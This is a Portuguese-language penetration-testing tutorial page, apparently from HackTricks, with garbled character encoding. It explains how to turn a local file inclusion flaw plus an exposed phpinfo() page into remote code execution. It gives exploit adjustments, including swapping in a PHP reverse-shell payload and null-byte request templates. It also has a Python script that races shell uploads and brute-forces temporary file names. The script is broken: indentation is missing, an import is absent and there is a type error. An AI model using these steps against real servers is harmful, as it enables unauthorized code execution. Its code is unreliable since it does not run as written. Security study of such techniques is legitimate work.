<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **versÃ£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos

- Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Para explorar essa vulnerabilidade vocÃª precisa: **Uma vulnerabilidade LFI, uma pÃ¡gina onde phpinfo() Ã© exibido, "file\_uploads = on" e o servidor precisa ter permissÃ£o para escrever no diretÃ³rio "/tmp".**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

VocÃª precisa corrigir o exploit (mudar **=>** para **=>**). Para fazer isso, vocÃª pode:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
VocÃª deve alterar tambÃ©m o **payload** no inÃ­cio do exploit (por um php-rev-shell, por exemplo), o **REQ1** (este deve apontar para a pÃ¡gina phpinfo e deve incluir o preenchimento, ou seja: _REQ1="""POST /install.php?mode=phpinfo&a="""+padding+""" HTTP/1.1_), e **LFIREQ** (este deve apontar para a vulnerabilidade LFI, ou seja: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Verifique o duplo "%" ao explorar o caractere nulo)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Teoria

Se uploads sÃ£o permitidos no PHP e vocÃª tenta fazer upload de um arquivo, este arquivo Ã© armazenado em um diretÃ³rio temporÃ¡rio atÃ© que o servidor termine de processar a solicitaÃ§Ã£o, entÃ£o este arquivo temporÃ¡rio Ã© deletado.

EntÃ£o, se vocÃª encontrou uma vulnerabilidade LFI no servidor web, vocÃª pode tentar adivinhar o nome do arquivo temporÃ¡rio criado e explorar um RCE acessando o arquivo temporÃ¡rio antes que ele seja deletado.

No **Windows**, os arquivos geralmente sÃ£o armazenados em **C:\Windows\temp\php<<**

No **linux**, o nome do arquivo costuma ser **aleatÃ³rio** e localizado em **/tmp**. Como o nome Ã© aleatÃ³rio, Ã© necessÃ¡rio **extrair de algum lugar o nome do arquivo temporÃ¡rio** e acessÃ¡-lo antes que seja deletado. Isso pode ser feito lendo o valor da **variÃ¡vel $\_FILES** dentro do conteÃºdo da funÃ§Ã£o "**phpconfig()**".

**phpinfo()**

O **PHP** usa um buffer de **4096B** e quando estÃ¡ **cheio**, Ã© **enviado ao cliente**. EntÃ£o o cliente pode **enviar** **muitas solicitaÃ§Ãµes grandes** (usando cabeÃ§alhos grandes) **fazendo upload de um php** reverse **shell**, esperar pela **primeira parte do retorno do phpinfo()** (onde o nome do arquivo temporÃ¡rio estÃ¡) e tentar **acessar o arquivo temporÃ¡rio** antes que o servidor php delete o arquivo explorando uma vulnerabilidade LFI.

**Script Python para tentar forÃ§a bruta no nome (se o comprimento = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **versÃ£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos

- Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
